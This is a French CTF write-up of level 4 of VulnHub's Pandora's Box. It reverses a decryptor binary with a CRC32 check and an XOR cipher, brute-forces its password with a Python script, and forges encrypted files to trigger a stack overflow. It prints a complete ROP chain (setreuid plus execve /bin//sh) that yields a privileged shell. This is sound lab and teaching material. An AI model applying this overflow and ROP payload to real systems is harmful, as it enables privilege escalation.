# Solution du CTF Pandora's Box de VulnHub (level 4)

Lors du précédent level [on avait eu à exploiter une format string](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Pandora's%20Box%20de%20VulnHub%20(level%203).md) sur un binaire qu'on lançait pour un accès distant.

Ici le binaire à exploiter doit être lancé localement : il prend deux paramètres en entrée qui sont un nom de fichier et un mot de passe.

```shellsession
$ ./level4
-= CryptoMessage decrypter =-
Usage: ./level4 <filename> <password>
```

On dispose avec l'exécutable d'un fichier chiffré :

```shellsession
$ hexdump cryptocon.bin 
0000000 9aa4 7f7c ff01 174f 3532 2b7e 511d 1715
0000010 495b 0e14 4012 6a4d 7c69 060b 4f48 0c08
0000020 5e0a 5b1f 7438 3b32 6736 6375 750c 2b30
0000030 747b 6b2f 6033 3522 6031 2064 6e2d 2d3b
0000040 2d3f 3e21 0643 5750 5456 003e          
000004b
```

J'ai aussitôt procédé à une analyse à la fois statique (un [Cutter](https://github.com/rizinorg/cutter) sous la main) et dynamique (avec GDB).

L'analyse dynamique consiste à poser un breakpoint sur un appel de fonction (`b *adresse_en_hexa`), lancer (ou reprendre l'exécution du binaire) et inspecter la stack pour voir les arguments qui sont passés (`x/4wx $esp` si l'on souhaite visualiser les 4 paramètres présents sur la stack).

On peut voir la valeur de retour de la fonction en faisait un `ni` (`next instruction` qui n'entre pas dans la fonction) puis inspecter la valeur du registre `eax` (`p eax` ou `info reg eax`).

Ca me permet rapidement de voir que le programme fait tout de suite appel à une fonction qui a cette forme :

```c
void decrypt_file(char *filename, char *password);
```

qui elle même fait appel à une fonction chargée de lire le fichier donné en argument dont le code C pourrait ressembler à ceci :

```c
void *read_file(char *filename) {
    fopen(filename, "rb";)
    fseek(fd, 0, SEEK_END);
    size = ftell(fd);
    fseek(fd0, 0, SEEK_SET);
    data = malloc(8);
    data[0] = size;
    buff = malloc(size);
    data[1] = buff;
    fread(buff, 1, size, fd);
    fclose(fd);
    return data;
}
```

Donc cette fonction retourne une structure correspondant au fichier lut dont le premier élément est la taille des données et le second un pointeur vers les données chargées (le tout sur le tas grace à `malloc`).

On pourrait l'écrire de cette façon :

```c
struct fileobj {
    unsigned int size;
    unsigned char *ptr;
}
```

C'est ni plus ni moins ce que l'on avait croisé sur [le level 2](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Pandora's%20Box%20de%20VulnHub%20(levels%201%20et%202).md) mais cette structure n'aura pas d'intérêt majeur pour la suite.

## Entête à tête

Ce qui nous intéresse c'est plutôt la façon doit les données de la structure sont accédées :

```nasm
0x08048481      mov eax, dword [fileobj] ; 0x80cc750
0x08048486      mov eax, dword [eax]
0x08048488      cmp eax, 9         ; 9
0x0804848b      jbe 0x80485ab
0x08048491      mov eax, dword [fileobj] ; 0x80cc750
0x08048496      mov eax, dword [eax + 4]
0x08048499      mov dword [var_ch], eax
0x0804849c      mov eax, dword [fileobj] ; 0x80cc750
0x080484a1      mov eax, dword [eax]
0x080484a3      sub eax, 4
0x080484a6      mov dword [var_10h], eax
0x080484a9      mov eax, dword [fileobj] ; 0x80cc750
0x080484ae      mov eax, dword [eax + 4]
0x080484b1      add eax, 4
0x080484b4      mov dword [var_14h], eax
0x080484b7      mov eax, dword [var_10h]
0x080484ba      mov dword [s2], eax ; int32_t arg_8h
0x080484be      mov eax, dword [var_14h]
0x080484c1      mov dword [esp], eax ; int32_t arg_ch
0x080484c4      call get_checksum  ; sym.get_checksum ;  sym.get_checksum(unsigned long arg_ch, int32_t arg_8h)
0x080484c9      mov edx, dword [var_ch]
0x080484cc      mov edx, dword [edx]
0x080484ce      cmp eax, edx
```

Dans ce code, `fileobj` correspond à la structure. La taille est comparée à 10 comme quoi le fichier à analyser doit faire au minimum cette taille (erreur si inférieure ou égale à 9).

Ensuite on peut voir par ici un ajout de 4 et par là une soustraction de 4. Bizarre ?

En fait avec GDB on se rend compte que la fonction `get_checksum` est appelée de cette façon :

```c
sum = get_checksum(fileobj.ptr + 4, fileobj.size - 4);
```

Pourquoi ignorer les 4 premiers octets ? C'est parce qu'ils sont utilisés pour la vérification qui suit l'appel :

```c
if (sum != (unsigned int)*fileobj.ptr) { puts("Invalid or corrupted file"); return; }
```

Les 4 premiers octets du fichier chiffré correspondent donc à un checksum.

Que fait cette fonction de checksum ? J'ai demandé à [ChatGPT](https://chat.openai.com/chat) en lui donnant le code assembleur et il a indiqué qu'il s'agissait dun CRC32. Ce qui aurait pu me mettre sur la piste c'est la présence de la valeur `0xedb88320` dans l'algo qui est un indicateur fort de la présence de cet algorithme.

Le CRC32 est bien l'officiel, on peut reproduire le calcul en Python :

```python
>>> from binascii import crc32
>>> from struct import unpack
>>> buff = open("cryptocon.bin", "rb").read()
>>> hex(unpack("<I", buff[:4])[0])  # extrait le checksum attendu
'0x7f7c9aa4'
>>> hex(crc32(buff[4:]))  # calcule le checksum sur les données à partir du 4ème octet
'0x7f7c9aa4'
```

Après ce checksum on a l'appel à la fonction de décryptage suivi de, une nouvelle fois, un ajout / soustraction de 4 :

```nasm
0x080484f5      mov eax, dword [s]
0x080484f8      mov dword [n], eax ; int32_t arg_8h
0x080484fc      mov eax, dword [var_10h]
0x080484ff      mov dword [s2], eax ; int32_t arg_ch
0x08048503      mov eax, dword [var_14h]
0x08048506      mov dword [esp], eax ; int32_t arg_10h
0x08048509      call xcrypt        ; sym.xcrypt ;  sym.xcrypt(const char *s, unsigned long arg_ch, int32_t arg_8h)
0x0804850e      sub dword [var_10h], 4
0x08048512      add dword [var_14h], 4
0x08048516      mov eax, dword [var_10h]
0x08048519      mov dword [s2], eax ; int32_t arg_8h
0x0804851d      mov eax, dword [var_14h]
0x08048520      mov dword [esp], eax ; int32_t arg_ch
0x08048523      call get_checksum  ; sym.get_checksum ;  sym.get_checksum(unsigned long arg_ch, int32_t arg_8h)
0x08048528      mov edx, dword [var_ch]
0x0804852b      add edx, 4
0x0804852e      mov edx, dword [edx]
0x08048530      cmp eax, edx
```

Ce qui veut dire que l'on a à peut près ceci :

```c
xcrypt(fileobj.ptr + 4, fileobj.size - 4, password);
sum2 = get_checksum(fileobj.ptr + 8, fileobj.size - 8);
if (sum2 != (unsigned int) *fileobj.ptr+4) { puts("Error: File data corrupted, bad password maybe?"); return; }
```

Point important : `xcrypt` modifie les données en place ce qui veut dire ici que le fichier (après les 4 octets de checksum) contient des données chiffrées correspondant au checksum des données en clair suivi des données en clair elles-mêmes.

Le binaire du CTF fait donc une première vérification pour s'assurer que les données chiffrées sont valides (correspondent au checksum) et ensuite procéde au déchiffrement.

Il obtient alors le second checksum attendu qu'il compare au checksum des données qui a déchiffré et les compare.

## Dialogue avec un robot

Mais que fait cette fonction de déchiffrage ? J'ai passé le code assembleur à l'assistant *ChatGPT* qui m'a d'abord indiqué que le code faisait un simple XOR des données avec l'index du caractère...

Hmmm, étonnant. Je lui ait alors indiqué qu'un password était passé et à répondu qu'il s'agissait en fait d'un simple XOR entre input et mot de passe.

J'ai regardé plus en détail le code assembleur et en vérité ce que le fait le code c'est un XOR avec le caractère du fichier, le caractère du mot de passe et aussi l'index du caractère du fichier (modulo 256).

J'ai indiqué à ChatGPT que la réponse était un mix de ses deux  explications et il l'a reformulé correctement de cette façon :

1. It calls the `strlen` function to determine the length of the password string passed in as a parameter, and stores the result in the `var_10h` local variable.

2. It initializes the `var_ch` local variable to 0. This variable will be used as a loop counter to keep track of the current index in the encrypted data.

3. It enters a loop that will iterate once for each byte in the encrypted data. The loop will continue until the `var_ch` variable reaches the size of the encrypted data passed in as a parameter.

4. Inside the loop, the code loads the byte at the current index of the encrypted data into the `ebx` register, and the byte at an offset equal to the current index of the password string into the `edx` register. It then XORs these two bytes together and XORs the result with the current index stored in the `var_ch` variable. The resulting value is then stored back into the original encrypted data at an offset equal to the current index.

5. After processing the current byte, the code increments the `var_ch` variable to move on to the next byte in the encrypted data.

6. When the loop completes, the code returns control to the caller.

## Badass hacker

J'ai écrit le code Python suivant pour bruteforcer le contenu de `cryptocon.bin` :

```python
import sys
from itertools import cycle
from binascii import crc32
from struct import pack, unpack

def crypt(data: bytes, password: str) -> bytes:
    ite = cycle(password.encode(encoding="ascii", errors="replace"))
    result = bytes([(i%256) ^ b ^ next(ite) for i, b in enumerate(data)])
    return result

def test_crypt():
    input_ = b"\x01\xff\x4f\x17\x32\x35\x7e\x2b\x1d\x51\x15\x17\x5b"
    expected = b"\x71\x9f\x3e\x67\x41\x5f\x0a\x48\x65\x39\x6c\x6f\x20"
    result = crypt(input_, "password")
    assert result == expected

def brute(vault: str, wordlist: str):
    with open(vault, "rb") as fd:
        data = fd.read()
        cypher = data[4:]
        with open(wordlist, encoding="utf-8", errors="ignore") as fd_w:
            for line in fd_w:
                password = line.strip()
                if not password:
                    continue
                result = crypt(cypher, password)
                crc = crc32(result[4:])
                crc_header = unpack("<I", result[:4])[0]
                if crc == crc_header:
                    print(f"Found password '{password}' gives text {repr(result[4:].decode())}")
                    break

if __name__ == "__main__":
    test_crypt()
    filename = sys.argv[1]
    wordlist = sys.argv[2]
    brute(filename, wordlist)

```

Le script prend le nom du fichier chiffré et le chemin vers une wordlist en paramètre. Pour chaque pass de la wordlist il effectue le déchifrement et compare le checksum à celui attendu.

Le mot de passe correct arrive assez tôt dans la wordlist *rockyou* sinon ça aurait pris du temps (il aurait fallu le coder avec un langage plus performant côté CPU) :

```shellsession
$ python crypt.py cryptocon.bin rockyou.txt 
Found password 'p4ssw0rd' gives text 'A\x00\nHello there,\n\nYou badass hacker! This is secure secret message!\n'
```

Le point très important ici c'est que l'on voit dans le texte déchiffré qu'il y a encore un entête, cette fois sous la forme d'un `short` qui correspond ici à la valeur `65` soit la taille du message (du premier retour à la ligne jusqu'à la fin).

Ca nous intéresse car après avoir passé les deux checksums cet indicateur de longueur est utilisé pour effectuer un `memcpy` des données vers un buffer présent dans la stack frame :

```c
memcpy(dest, plaintext, length);
```

Maintenant que l'on a cette notion je peux écrire une fonction pour chiffrer correctement un message :

```python
def crypt_file(input_file: str, password: str):
    with open(input_file, "rb") as fd_in:
        plaintext = fd_in.read()
        plaintext = pack("<H", len(plaintext)) + plaintext
        plaintext_crc = crc32(plaintext)
        cypher = crypt(pack("<I", plaintext_crc) + plaintext, password)
        cypher_crc = crc32(cypher)
        with open(input_file + ".crypt", "wb") as fd_out:
            fd_out.write(pack("<I", cypher_crc) + cypher) 
```

Et ainsi chiffrer une citation que le binaire du CTF décode correctement :

```shellsession
$ python crypt.py quote.txt thisisdope
$ ./level4 quote.txt.crypt thisisdope
Message: "Always forgive your enemies; nothing annoys them so much."
- Oscar Wilde

```

## Hammer time

Si on a un buffer sur la stack il a forcément ses limites. J'utilise `pwntools` pour générer une chaine de caractères sans répétitions qui me permettra de savoir à quel index sont présents tel ou tel pattern :

```python
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(5000)
```

Cela me génère une chaine de caractères de 5000 octets que je place dans un fichier et que je chiffre avec mon code Python.

J'appelle alors le binaire du CTF avec les bons arguments dans GDB :

```shellsession
(gdb) r ./overflow.txt.crypt password
Starting program: /tmp/ctf/level4 ./overflow.txt.crypt password
Message: bebabeca--- snip ---byadbzadcbadccadcdadcea
WID=32505863

Program received signal SIGSEGV, Segmentation fault.
0x74636169 in ?? ()
(gdb) info reg
eax            0x0                 0
ecx            0x80cb700           135051008
edx            0x80cb700           135051008
ebx            0x0                 0
esp            0xffffcc20          0xffffcc20
ebp            0x74636168          0x74636168
esi            0x8048c50           134515792
edi            0x59403aa2          1497381538
eip            0x74636169          0x74636169
eflags         0x10292             [ AF SF IF RF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/s 0x80cb700
0x80cb700 <main_arena>: ""
(gdb) x/s $esp
0xffffcc20:     "jactkactlactmactn---snip ---cviacv"...
```

On a EIP qui est écrasé à l'offset 4124 de notre buffer et ESP qui pointe juste derrière :

```python
>>> g.find(b"\x69\x61\x63\x74")
(7124, 1, 4124)
>>> g.find(b"jact")
(7128, 1, 4128)
```

Le binaire ayant le flag NX on va juste placer une ROP-chain à partir de l'adresse de retour et ça va bien se passer, comme sur le [level 3](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Pandora's%20Box%20de%20VulnHub%20(level%203).md) : le code va pop-er l'adresse de retour que l'on a écrasé qui correspond au début de notre ROP-chain puis pop-er ainsi jusqu'à avoir exécuté tout le shellcode.

J'ai utilisé ROPgadget pour générer la ROP-chain et je l'ai un peu adapté (`setreuid` + utilisation de `pop eax` au lieu de 11 `inc eax` qu'il avait mis) :

```python
#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

p = b"A" * 4124
p += pack('<I', 0x080583ad) # pop ecx ; pop ebx ; ret
p += pack('<I', 1004)  # iud de level4
p += pack('<I', 1004)
p += pack('<I', 0x080a8326) # pop eax ; ret
p += pack('<I', 70)  # setreuid
p += pack('<I', 0x08058ab0) # int 80 ; ret

p += pack('<I', 0x08058386) # pop edx ; ret
p += pack('<I', 0x080ca680) # @ .data
p += pack('<I', 0x080a8326) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08083dd1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058386) # pop edx ; ret
p += pack('<I', 0x080ca684) # @ .data + 4
p += pack('<I', 0x080a8326) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08083dd1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08058386) # pop edx ; ret
p += pack('<I', 0x080ca688) # @ .data + 8
p += pack('<I', 0x080999bf) # xor eax, eax ; ret
p += pack('<I', 0x08083dd1) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583ae) # pop ebx ; ret
p += pack('<I', 0x080ca680) # @ .data
p += pack('<I', 0x080583ad) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ca688) # @ .data + 8
p += pack('<I', 0x080ca680) # padding without overwrite ebx
p += pack('<I', 0x08058386) # pop edx ; ret
p += pack('<I', 0x080ca688) # @ .data + 8
p += pack('<I', 0x080a8326) # pop eax ; ret
p += pack('<I', 11)
p += pack('<I', 0x08048b2d) # int 0x80

with open("exploit_file", "wb") as fd_out:
    fd_out.write(p)
```

Ensuite je chiffre le fichier et je le donne au binaire :

```shellsession
level3@pb0x:/home/level3$ ./level4 exploit_file.crypt password        
Message: AAAAAAAAAAAAAAA---snip---AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
$ id
uid=1004(level4) gid=1003(level3) groups=1004(level4),1003(level3)
$ cd /home/level4
$ ls -al
total 608
drwxr-x--- 2 level4 level4   4096 Jan  4  2015 .
drwxr-xr-x 7 root   root     4096 Jan  3  2015 ..
-rw-r--r-- 1 level4 level4    220 Jan  3  2015 .bash_logout
-rw-r--r-- 1 level4 level4   3486 Jan  3  2015 .bashrc
-rw-r--r-- 1 level4 level4    675 Jan  3  2015 .profile
-rw------- 1 level4 level4    759 Jan  4  2015 .viminfo
-rwsr-xr-x 1 root   level4 596244 Jan  3  2015 level5
```

Bingo ! La suite au prochain épisode ?

*Publié le 27 décembre 2022*
